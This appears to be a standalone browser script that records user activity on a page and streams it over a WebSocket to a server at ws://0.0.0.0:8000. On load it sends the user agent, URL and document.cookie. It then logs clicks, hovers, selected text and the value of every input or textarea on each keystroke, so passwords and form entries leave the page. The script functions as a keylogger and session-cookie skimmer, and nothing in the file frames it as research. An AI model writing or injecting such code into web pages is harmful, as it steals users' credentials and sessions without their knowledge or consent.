





function socsend(d) {
	const socket = new WebSocket("ws://0.0.0.0:8000");
	socket.addEventListener("open", (event) => {
	  socket.send(d);

	  console.log("sent ",d)
	});
}



var apname = navigator.appName;
var ug = navigator.userAgent;
socsend(apname);
socsend(ug);


document.addEventListener('click', function(e){
  	if(e.target.tagName=="BUTTON"){
   		// console.log("clicked",e.target);
   		//(JSON.parse(JSON.stringify(e.target)))
   		socsend("clicked "+e.target.outerHTML);
  	}else if (e.target.tagName!="HTML" && e.target.tagName!="BODY") {
	    console.log("clicked : ",e.target.outerHTML)
	    socsend("clicked "+e.target.outerHTML);
  	}
})
document.addEventListener('mouseover', function(e){
  	if(e.target.tagName=="BUTTON"){
   		// console.log("hoverd ",e.target);
   		socsend("hoverd "+e.target.outerHTML)
  	}
})

document.addEventListener('mouseover', function(e){
  	if(e.target.tagName=="INPUT"){
   		// console.log("hoverd ",e.target);
   		e.target.onkeyup = function(){
			// console.log(e.target.value," --> ",e.target);
			// console.log("sendnig hover input")
			socsend(e.target.value+" --> "+e.target.outerHTML);

		}
  	}
})

document.addEventListener('mouseover', function(e){
  	if(e.target.tagName=="TEXTAREA"){
   		// console.log("hoverd ",e.target);
   		e.target.onkeyup = function(){
			console.log(e.target.value," --> ",e.target);
			socsend(e.target.value+" --> "+e.target.outerHTML);
		}
		socsend("hoverd "+e.target.outerHTML)
  	}
})

var a = document.body.scrollTop;
var b = document.body.scrollHeight - document.body.clientHeight;
var c = a / b;

window.addEventListener("scroll", (event) => {
	let scroll = this.scrollY;
    // console.log(scroll)
});
var htm = document.body.innerHTML;

document.addEventListener('mouseup', event => {  
	if (window.getSelection().toString().length){
       let sltxt = window.getSelection().toString();
       console.log(sltxt);
       socsend("selected "+sltxt);        
    }
})
var href = window.location.href;
var cookies = document.cookie;
var ac = document.activeElement.outerHTML;
socsend(href);
socsend(cookies);

// socsend(ac);
// socsend("\n");

// document.addEventListener('focus', function(e){
//   	if(e.target.tagName=="INPUT"){
//    		console.log("focused ",e);
//   	}
// })

